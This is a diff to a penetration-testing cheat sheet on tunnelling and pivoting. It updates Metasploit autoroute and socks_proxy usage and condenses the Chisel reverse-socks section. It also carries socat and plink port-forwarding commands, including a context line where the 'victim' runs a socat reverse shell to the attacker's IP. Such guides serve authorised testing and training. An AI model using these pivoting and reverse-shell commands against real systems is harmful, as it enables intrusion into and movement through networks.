@@ -88,8 +88,8 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 
 ```bash
 background# meterpreter session
-route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 2552.55.255.0 8)
-use auxiliary/server/socks4a
+route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
+use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
@@ -98,13 +98,15 @@ Another way:
 
 ```bash
 background #meterpreter session
-use post/windows/manage/autoroute
+use post/multi/manage/autoroute
 set SESSION <session_n>
 set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
 set NETMASK <Netmask>
 run
-use auxiliary/server/socks4a
+use auxiliary/server/socks_proxy
+set VERSION 4a
 run #Proxy port 1080 by default
+echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 
 ## reGeorg
@@ -119,44 +121,23 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)  
+You need to use the **same version for client and server**
 
-Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go \(golang\). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance.
-
-You can do port forwarding \(bind & reverse\), create a socks proxy \(bind & reverse\).
+### socks
 
 ```bash
-root@kali:/opt# git clone https://github.com/jpillora/chisel.git
-Cloning into 'chisel'...
-remote: Enumerating objects: 33, done.
-remote: Counting objects: 100% (33/33), done.
-remote: Compressing objects: 100% (27/27), done.
-remote: Total 1151 (delta 7), reused 18 (delta 5), pack-reused 1118
-Receiving objects: 100% (1151/1151), 3.31 MiB | 19.03 MiB/s, done.
-Resolving deltas: 100% (416/416), done.
-
-root@kali:/opt/chisel# ./chisel --help
-
-  Usage: chisel [command] [--help]
-
-  Version: 0.0.0-src
-
-  Commands:
-    server - runs chisel in server mode
-    client - runs chisel in client mode
-
-  Read more:
-    https://github.com/jpillora/chisel
+./chisel server -p 8080 --reverse #Server
+./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
+#And now you can use proxychains with port 1080 (default)
 ```
 
-![](https://0xdf.gitlab.io/img/chisel-2.webp)
+### Port forwarding
 
-Read more:
-
-* [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) \(Blog by Oxdf\)
-* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
-* [https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s) \(HTB Reddish by ippsec\)
-* [https://0xdf.gitlab.io/2019/01/26/htb-reddish.html](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) \(HTB Reddish by 0xdf\)
+```bash
+./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
+./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
+```
 
 ## Rpivot
 
@@ -204,7 +185,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ### Port2Port
 
 ```bash
-socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>,<rport> &
+socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
 ```
 
 ### Port2Port through socks
@@ -270,8 +251,8 @@ It's like a console PuTTY version \( the options are very similar to a ssh clien
 As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:
 
 ```bash
-plink.exe -l <Our_valid_username> -pw <valid_password> -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
-plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
+echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
+echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
 
 ## NTLM proxy bypass
